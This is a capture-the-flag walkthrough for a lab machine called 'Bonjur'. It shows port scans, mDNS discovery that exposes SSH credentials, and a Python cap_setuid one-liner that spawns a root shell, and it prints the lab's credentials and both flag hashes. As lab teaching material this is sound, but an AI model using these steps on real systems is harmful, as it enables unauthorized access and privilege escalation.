+++
title = "Bonjur - Walkthrough"
date = "2026-07-01"
author = "nvru"
description = "Walkthrough for the Bonjur easy machine."
tags = ["ctf", "walkthrough", "linux", "network", "privilege-escalation"]
draft = false
+++

![VM](/images/hmv/bonjur/vm.png)

## Target Information

| Role     | IP Address   |
| -------- | ------------ |
| Attacker | `10.10.10.2` |
| Machine  | `10.10.10.4` |

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.4 -- -A -oN nmap/rust
```

### Results

```text
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Nmap (UDP)

```bash
nmap -sSCV -p- -sU 10.10.10.4 -oA nmap/udp_top_100 --top-ports 100
```

### Results

```text
Not shown: 99 closed tcp ports (reset), 97 closed udp ports (port-unreach)

PORT      STATE         SERVICE  VERSION
22/tcp    open          ssh      OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
68/udp    open|filtered dhcpc
5353/udp  open|filtered zeroconf
32815/udp open|filtered unknown

MAC Address: 08:00:27:6B:4A:02 (Oracle VirtualBox virtual NIC)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# Enumeration

## mDNS Service Discovery

Reference:

https://hacktricks.wiki/en/network-services-pentesting/5353-udp-multicast-dns-mdns.html

```bash
nmap -sU -p 5353 --script=dns-service-discovery 10.10.10.4
```

### Results

```text
Nmap scan report for 10.10.10.4
Host is up (0.00019s latency).

PORT     STATE SERVICE
5353/udp open  zeroconf

| dns-service-discovery:
|   22/tcp ssh:
|     ipv4: 10.10.10.4
|     name: debian SSH
|     hostname: debian
|     TXT:
|_      username=user password=Aroipo902!

MAC Address: 08:00:27:6B:4A:02 (Oracle VirtualBox virtual NIC)
```

The scan identified **UDP port 5353** running **mDNS (Zeroconf)**. By enumerating services advertised through mDNS, the `dns-service-discovery` script discovered an SSH service and extracted its associated TXT record. The TXT record contained valid SSH credentials (`user` / `Aroipo902!`), indicating that sensitive information was being exposed through service discovery. These credentials were then used to authenticate to the target over SSH, providing the initial foothold on the system.

---

# SSH Access

```bash
ssh user@10.10.10.4
# password: Aroipo902!
```

---

# Privilege Escalation

After obtaining a shell as the `user` account, I first checked whether the user had any `sudo` privileges.

```bash
sudo -l
```

The output showed that the account was not allowed to execute commands with `sudo`.

Next, I enumerated SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Although several SUID binaries were present, none were useful for privilege escalation.

I then searched for binaries with Linux capabilities assigned.

```bash
getcap -r / 2>/dev/null
```

The enumeration revealed that the Python interpreter had the `cap_setuid` capability:

```text
/usr/bin/python3.13 cap_setuid=ep
```

The `cap_setuid` capability allows a binary to change its effective user ID without requiring full root privileges. Since the Python interpreter possessed this capability, it could invoke `setuid(0)` and execute commands as the root user.

For more information about Linux capabilities, see the HackTricks documentation:

- https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html

Using Python, I changed the effective UID to `0` and spawned a root shell:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

This successfully provided a root shell.

![Privilege Escalation](/images/hmv/bonjur/find_cap.png)

## Root

With root privileges obtained, I was able to read the root flag.

![Root](/images/hmv/bonjur/root.png)

---

# Credentials

## SSH

```text
user : Aroipo902!
```

---

# Flags

```text
user flag : 87e9d005abf182cf3ab905d009c90e3e49e1b1049862de64ae2f94c76ddec3bd
root flag : 79965b8036fe42fa255e8810e562a556d931406430ec54b619aff1916668e2b3
```
